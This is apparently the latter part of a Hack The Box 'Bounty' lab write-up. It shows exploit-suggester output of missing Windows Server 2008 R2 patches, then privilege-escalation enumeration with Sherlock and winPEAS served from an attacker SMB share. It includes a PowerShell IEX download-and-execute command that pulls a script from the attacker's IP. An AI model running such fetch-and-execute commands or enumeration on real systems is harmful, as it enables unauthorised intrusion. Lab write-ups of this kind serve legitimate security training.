CVE: CVE-2012-0162
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0162
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120612
CVE: CVE-2012-0173
KB: KB2685939
Title: Vulnerabilities in Remote Desktop Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20111213
CVE: CVE-2011-3397
KB: KB2618451
Title: Cumulative Security Update of ActiveX Kill Bits
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130409
CVE: CVE-2013-1296
KB: KB2813347
Title: Vulnerability in Remote Desktop Client Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Remote Desktop Connection 7.0 Client
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110614
CVE: CVE-2011-1869
KB: KB2535512
Title: Vulnerabilities in Distributed File System Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20111229
CVE: CVE-2011-3414
KB: KB2656355
Title: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Elevation of Privilege
Exploit: n/a

Date: 20130409
CVE: CVE-2013-2013
KB: KB2817183
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 9
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130409
CVE: CVE-2013-2013
KB: KB2817183
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 8
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110111
CVE: CVE-2011-0027
KB: KB2419640
Title: Vulnerabilities in Microsoft Data Access Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Data Access Components 6.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0181
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0181
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0181
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0164
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0164
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0164
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110308
CVE: CVE-2011-0042
KB: KB2479943
Title: Vulnerabilities in Windows Media Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-1848
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-1848
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-1848
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1853
KB: KB2712808
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1853
KB: KB2705219
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100209
CVE: CVE-2010-0250
KB: KB975560
Title: Vulnerability in Microsoft DirectShow Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft DirectX
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0161
KB: KB2604114
Title: Vulnerabilities in .NET Framework Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110308
CVE: CVE-2011-0032
KB: KB2479943
Title: Vulnerabilities in Windows Media Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130409
CVE: CVE-2013-2014
KB: KB2817183
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 9
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130409
CVE: CVE-2013-2014
KB: KB2817183
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 8
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20081111
CVE: CVE-2008-4033
KB: KB954430
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 4.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121113
CVE: CVE-2012-1527
KB: KB2727528
Title: Vulnerabilities in Windows Shell Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1852
KB: KB2712808
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1852
KB: KB2705219
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121113
CVE: CVE-2012-1528
KB: KB2727528
Title: Vulnerabilities in Windows Shell Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121113
CVE: CVE-2012-2519
KB: KB2729451
Title: Vulnerabilities in .NET Framework Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121113
CVE: CVE-2012-4777
KB: KB2729451
Title: Vulnerabilities in .NET Framework Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100713
CVE: CVE-2009-3678
KB: KB2032276
Title: Vulnerability in Canonical Display Driver Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100914
CVE: CVE-2010-2729
KB: KB2347290
Title: Vulnerability in Print Spooler Service Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20121113
CVE: CVE-2012-4776
KB: KB2729451
Title: Vulnerabilities in .NET Framework Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100810
CVE: CVE-2010-2561
KB: KB2079403
Title: Vulnerability in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 3.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120710
CVE: CVE-2012-1891
KB: KB2698365
Title: Vulnerability in Microsoft Data Access Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Data Access Components 6.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1850
KB: KB2712808
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120814
CVE: CVE-2012-1850
KB: KB2705219
Title: Vulnerabilities in Windows Networking Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2011-3402
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2011-3402
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2011-3402
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110209
CVE: SPSRV8R2X64SP1
KB: KBSPSRV8R2X64SP1
Title: Windows Server 2008 R2 for x64-based Systems Service Pack 1
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: No more updates
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0180
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0180
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0180
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120710
CVE: CVE-2012-1524
KB: KB2719177
Title: Cumulative Security Update for Internet Explorer
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Internet Explorer 9
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20081111
CVE: CVE-2008-4029
KB: KB954430
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 4.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20111229
CVE: CVE-2011-3417
KB: KB2656355
Title: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Elevation of Privilege
Exploit: n/a

Date: 20130108
CVE: CVE-2013-0007
KB: KB2758694
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 4.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130108
CVE: CVE-2013-0007
KB: KB2757638
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 3.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20130108
CVE: CVE-2013-0007
KB: KB2757638
Title: Vulnerabilities in Microsoft XML Core Services Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft XML Core Services 6.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120313
CVE: CVE-2012-0152
KB: KB2667402
Title: Vulnerabilities in Remote Desktop Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120313
CVE: CVE-2012-0152
KB: KB2621440
Title: Vulnerabilities in Remote Desktop Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0159
KB: KB2659262
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0159
KB: KB2656410
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Microsoft .NET Framework 3.5.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20120508
CVE: CVE-2012-0159
KB: KB2676562
Title: Combined Security Update for Microsoft Office, Windows, .NET Framework, and Silverlight
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110412
CVE: CVE-2011-0657
KB: KB2509553
Title: Vulnerability in DNS Resolution Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: 
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100608
CVE: CVE-2010-1880
KB: KB979482
Title: Vulnerabilities in Media Decompression Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Asycfilt.dll (COM component)
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20110111
CVE: CVE-2011-0026
KB: KB2419640
Title: Vulnerabilities in Microsoft Data Access Components Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Windows Data Access Components 6.0
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

Date: 20100413
CVE: CVE-2010-0487
KB: KB979309
Title: Vulnerabilities in Windows Could Allow Remote Code Execution
Affected product: Windows Server 2008 R2 for x64-based Systems
Affected component: Cabinet File Viewer Shell Extension 6.1
Severity: Critical
Impact: Remote Code Execution
Exploit: n/a

[+] Missing patches: 40
    - KB2659262: patches 10 vulnerabilities
    - KB2656410: patches 10 vulnerabilities
    - KB2676562: patches 10 vulnerabilities
    - KB2817183: patches 6 vulnerabilities
    - KB2729451: patches 5 vulnerabilities
    - KB2712808: patches 4 vulnerabilities
    - KB2705219: patches 4 vulnerabilities
    - KB2757638: patches 4 vulnerabilities
    - KB2656355: patches 3 vulnerabilities
    - KB954430: patches 3 vulnerabilities
    - KB2631813: patches 2 vulnerabilities
    - KB979482: patches 2 vulnerabilities
    - KB2667402: patches 2 vulnerabilities
    - KB2621440: patches 2 vulnerabilities
    - KB2535512: patches 2 vulnerabilities
    - KB2753842: patches 2 vulnerabilities
    - KB2604114: patches 2 vulnerabilities
    - KB2719177: patches 2 vulnerabilities
    - KB979309: patches 2 vulnerabilities
    - KB2758694: patches 2 vulnerabilities
    - KB2419640: patches 2 vulnerabilities
    - KB2479943: patches 2 vulnerabilities
    - KB2727528: patches 2 vulnerabilities
    - KB2769369: patches 1 vulnerability
    - KB972270: patches 1 vulnerability
    - KB2758857: patches 1 vulnerability
    - KB2536276: patches 1 vulnerability
    - KB2654428: patches 1 vulnerability
    - KB2653956: patches 1 vulnerability
    - KB978542: patches 1 vulnerability
    - KB982132: patches 1 vulnerability
    - KB2685939: patches 1 vulnerability
    - KB2618451: patches 1 vulnerability
    - KB2813347: patches 1 vulnerability
    - KB975560: patches 1 vulnerability
    - KB2032276: patches 1 vulnerability
    - KB2347290: patches 1 vulnerability
    - KB2079403: patches 1 vulnerability
    - KB2698365: patches 1 vulnerability
    - KB2509553: patches 1 vulnerability
[+] Missing service pack
    - Windows Server 2008 R2 for x64-based Systems Service Pack 1
[+] KB with the most recent release date
    - ID: KB2817183
    - Release date: 20130409

[+] Done. Displaying 103 of the 207 vulnerabilities found.

```

### Sherlock & WinPEAS
Download the deprecated version of Sherlock into your shared folder
```
wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1

wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASbat/winPEAS.bat

wget https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe
```

To test another (and more stable) possibility do get file on the target machine, we start a local smb server and share the share folder.
```
cd ~/htb
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share share/
```

Use the following commands to download sherlock and winpeas on the target machine:
```
PS C:\users\merlin\desktop> copy \\10.10.17.226\share\Sherlock.ps1 Sherlock.ps1
PS C:\users\merlin\desktop> copy \\10.10.17.226\share\winPEAS.bat winPEAS.bat
PS C:\users\merlin\desktop> copy \\10.10.17.226\share\winPEASany.exe winPEASany.exe
PS C:\users\merlin\desktop> dir


    Directory: C:\users\merlin\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         7/23/2021   6:37 AM      16663 Sherlock.ps1                      
-a---         7/23/2021   6:39 AM      35108 winPEAS.bat                       
-a---         7/23/2021   6:40 AM    1919488 winPEASany.exe                    


PS C:\users\merlin\desktop> 
```

#### Sherlock

Run Sherlock (takes > 30 sec)
```
PS C:\users\merlin\desktop> IEX(New-Object Net.Webclient).downloadString('http://10.10.17.226/Sherlock.ps1'); Find-AllVulns


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Appears Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Supported on single-core systems

Title      : Windows Kernel-Mode Drivers EoP
MSBulletin : MS16-034
CVEID      : 2016-0093/94/95/96
Link       : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1
             6-034?
VulnStatus : Not Vulnerable

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S
             ample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h
             tml
VulnStatus : Not Vulnerable
```

#### Watson
Did not compile with .Net 2.0.

#### WinPEASexe
Requires .Net >= 4.5

#### WinPEASbat
```
PS C:\users\merlin\desktop> Start-Process "cmd.exe"  "/c C:\users\merlin\desktop\winPEAS.bat > output_winPEAS.txt"

PS C:\users\merlin\desktop> type output_winPEAS.txt

            ((,.,/((((((((((((((((((((/,  */

 [+] SERVICE BINARY PERMISSIONS WITH WMIC and ICACLS
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services

 [+] CHECK IF YOU CAN MODIFY ANY SERVICE REGISTRY
   [?] https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services

---
Scan complete.
```

#### Metasploit
TODO Windows Kernel exploitation with MS10-092


```
```


## Resources
* https://0xdf.gitlab.io/2018/10/27/htb-bounty.html
* https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/bounty-writeup-w-o-metasploit
* https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/
* https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
* https://bigb0sss.github.io/posts/htb-bounty-writeup/
* https://cve.mitre.org/data/downloads/index.html

